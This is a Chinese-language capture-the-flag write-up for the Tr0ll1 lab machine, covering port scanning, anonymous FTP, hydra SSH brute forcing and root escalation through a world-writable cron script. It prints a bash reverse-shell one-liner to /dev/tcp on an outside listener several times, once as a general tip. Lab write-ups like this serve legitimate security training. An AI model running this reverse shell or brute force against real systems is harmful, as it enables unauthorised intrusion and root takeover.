# 信息搜集

1、端口扫描

```bash
└─# nmap -sV -p- -A -O 192.168.0.102 -oA Tr0ll1/nmap.txt
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.0.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d618d9ef75d31c29be14b52b1854a9c0 (DSA)
|   2048 ee8c64874439538c24fe9d39a9adeadb (RSA)
|   256 0e66e650cf563b9c678b5f56caae6bf4 (ECDSA)
|_  256 b28be2465ceffddc72f7107e045f2585 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 00:0C:29:9B:F1:90 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2、如上 namp 信息发现 21 端口 ftp 可匿名登录

```bash
└─# ftp 192.168.0.102
Connected to 192.168.0.102.
220 (vsFTPd 3.0.2)
Name (192.168.0.102:root): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||37326|).
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
226 Directory send OK.
ftp> binary 
200 Switching to Binary mode.
ftp> get lol.pcap
local: lol.pcap remote: lol.pcap
229 Entering Extended Passive Mode (|||19026|).
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
100% |*********************************************************************************************************************|  8068        9.80 MiB/s    00:00 ETA
226 Transfer complete.
8068 bytes received in 00:00 (5.90 MiB/s)
ftp> exit
221 Goodbye.
```

下载 lol.pcap ，并可以用 `wireshark` 打开查看，也可以用 `strings` 命令查看里面包含的字符串

```bash
└─# strings lol.pcap 
Linux 3.12-kali1-486
Dumpcap 1.10.2 (SVN Rev 51934 from /trunk-1.10)
eth0	
host 10.0.0.6
Linux 3.12-kali1-486
220 (vsFTPd 3.0.2)
"USER anonymous
331 Please specify the password.
PASS password
230 Login successful.
SYST
215 UNIX Type: L8
PORT 10,0,0,12,173,198
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
226 Directory send OK.
TYPE I
W200 Switching to Binary mode.
PORT 10,0,0,12,202,172
g>	@
W200 PORT command successful. Consider using PASV.
RETR secret_stuff.txt
W150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
WWell, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
Sucks, you were so close... gotta TRY HARDER!
W226 Transfer complete.
TYPE A
O200 Switching to ASCII mode.
{PORT 10,0,0,12,172,74
O200 PORT command successful. Consider using PASV.
{LIST
O150 Here comes the directory listing.
O-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
O226 Directory send OK.
{QUIT
221 Goodbye.
Counters provided by dumpcap
```

lol.pcap 里有关键信息，`sup3rs3cr3tdirlol` 可能是web目录或者账号密码啥的

```
WWell, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
Sucks, you were so close... gotta TRY HARDER!
```

3、80 端口 web 探测

```http
http://192.168.0.102/robots.txt
```

robots.txt：

```
User-agent:*
Disallow: /secret
```

用之前探测的 特殊字符 `sup3rs3cr3tdirlol` 来拼接web路径

```http
http://192.168.0.102/sup3rs3cr3tdirlol/
```

<img src=".\图片\Snipaste_2023-06-28_17-15-05.png" alt="Snipaste_2023-06-28_17-15-05" style="zoom:80%;" />

# web打点

## 查看敏感文件

紧接上文

下载 `roflmao` 并查看，特殊字符串 `0x0856BF`，由 `Find address 0x0856BF to proceed` 发现可能是地址

```bash
└─# wget http://192.168.0.102/sup3rs3cr3tdirlol/roflmao
└─# file roflmao 
└─# strings roflmao 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
printf
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
Find address 0x0856BF to proceed
........
```

于是拼接到web目录里看看

```http
http://192.168.0.102/0x0856BF/
```

<img src=".\图片\Snipaste_2023-06-28_17-22-36.png" alt="Snipaste_2023-06-28_17-22-36" style="zoom:80%;" />

两个目录文件好像分别是 账号密码

## 爆破SSH

下载这两个文件分别作为账号密码，跑跑 ssh ，结果失败

于是再思考一下提示信息 `[this_folder_contains_the_password/])`

<img src=".\图片\Snipaste_2023-06-28_17-25-05.png" alt="Snipaste_2023-06-28_17-25-05" style="zoom:80%;" />

可能 `Pass.txt` 也包含在密码里，浴室把它加到密码本里

```bash
└─# cat Pass.txt 
Good_job_:)
Pass.txt
Pass
txt
```

```bash
└─# hydra -L which_one_lol.txt -P Pass.txt ssh://192.168.0.102 -t 4
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-28 05:39:55
[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task
[DATA] attacking ssh://192.168.0.102:22/
[22][ssh] host: 192.168.0.102   login: overflow   password: Pass.txt
```

得到用户名密码：

```
overflow:Pass.txt
```

ssh登录

```bash
└─# ssh overflow@192.168.0.102
$ python -c 'import pty; pty.spawn("/bin/bash")'
overflow@troll:/$ 
```

# 提权

SSH登录靶机之后，发现无操作几分钟后，会话自动断开，原因可能是设置了计划任务。进而查看相应日志`/var/log/cronlog`

```bash
overflow@troll:/$ cat /var/log/cronlog
*/2 * * * * cleaner.py
```

注意：这个脚本不是负责结束会话的脚本

查找 `cleaner.py`

```bash
overflow@troll:/$ find / -type f -name "cleaner.py" 2>/dev/null
/lib/log/cleaner.py
```

查看 `cleaner.py` ，发现当前用户可以修改这个以 root 身份运行的脚本

```bash
overflow@troll:/$ cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
	os.system('rm -r /tmp/* ')
except:
	sys.exit()
overflow@troll:/$ ls -al /lib/log/
total 12
drwxr-xr-x  2 root root 4096 Aug 13  2014 .
drwxr-xr-x 22 root root 4096 Aug 10  2014 ..
-rwxrwxrwx  1 root root   96 Aug 13  2014 cleaner.py
```

修改脚本提权

```bash
overflow@troll:/$ cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
	os.system("/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.103/1234 0>&1'")
except:
	sys.exit()
```

```
/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.103/1234 0>&1'
```

得到反弹shell

```bash
─# nc -lvvp 1234            
listening on [any] 1234 ...
connect to [192.168.0.103] from 192.168.0.102 [192.168.0.102] 37753
bash: cannot set terminal process group (2249): Inappropriate ioctl for device
bash: no job control in this shell
root@troll:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@troll:~# cd
cd
root@troll:~# ls
ls
proof.txt
root@troll:~# cat p*
cat p*
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
```

# 总结

根据靶场提示，把提示信息理解了，比如把什么神秘字符串加到web路径中啦，比如把密码本文件名加入到密码本中啦

查找计划任务没找到或没权限查看时，可以看看计划任务的日志信息 `cat /var/log/cronlog`

反弹shell时最好 /bin/bash -c 加参数尝试

```
/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.103/1234 0>&1'
```
